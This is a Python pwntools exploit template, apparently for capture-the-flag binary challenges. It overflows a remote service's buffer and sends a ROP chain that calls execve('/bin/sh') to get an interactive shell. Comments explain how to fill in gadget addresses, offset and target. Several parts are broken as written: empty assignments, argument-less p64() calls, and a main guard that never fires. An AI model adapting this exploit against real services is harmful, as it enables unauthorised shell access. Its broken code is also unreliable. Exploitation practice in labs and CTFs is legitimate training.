from pwn import *
import time

#IF THIS DOES NOT WORK THEN TRY USING ROPPING WITH LIBC

VULN = "" #NAME OF FILE THATS VULNERABLE | STR

ARCH = "" #ARCHITECTURE IT WAS COMPILED ON USE CHECKSEC | STR

ADDRESS = "" #ADDRESS OF ENDPOINT | STR

PORT = #PORT OF ENDPOINT | INT

OFFSET = #YOUR OFFSET FOR THE BUFFER OVERFLOW | INT

context.clear(arch=ARCH)
elf = ELF(VULN)
p = remote(ADDRESS, PORT) 

def injectString(value):
    res = "0x"
    for i in range(len(value)-1, -1, -1):
        res += hex(ord(value[i]))[2:].zfill(2)
    return int(res, 16)
 
def Payload():

    #USE ROPgadget --binary ./vuln --ropchain TO FIND ADDRESSES

    #IF 32BIT PROGRAM CHANGE p64 to p32

    offset = b'a' * OFFSET #YOUR OFFSET FOR THE BUFFER OVERFLOW

    pop_rax = p64() #ADDRESS FOR POPPING RAX REGISTER | HEX

    bin_syscall = p64(injectString("/bin/sh")) #FOR REVERSE SHELL

    pop_rsi = p64() #ADDRESS FOR POPPING RSI | HEX
    
    data_address = p64() #readelf -S vuln Use this to find places to right. Find a .bss with Write Access | HEX
    
    mov_rsi_rax = p64() #mov qword ptr [rsi], rax ; ret | HEX
    
    pop_rdi = p64() #POP_RDI ADDRESS | HEX

    pop_rdx = p64() #POP_RDX ADDRESS | HEX

    syscall = p64() #SYSTEM CALL ADDRESS | HEX

    payload = offset + pop_rax + bin_syscall + pop_rsi + data_address + mov_rsi_rax + pop_rax + p64(0x3b) + pop_rdi + data_address + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + syscall

    return payload


def main():

      p.recvuntil(b'') #Call this to recieve lines until some binary string. Copy to use as many times as needed
      
      p.sendline(Payload()) #When its time to send the payload you strike

      time.sleep(0.5) #Wait a half second

      p.interactive() #Hopefully you got a reverse Shell

if __name__ == "main":
      main()
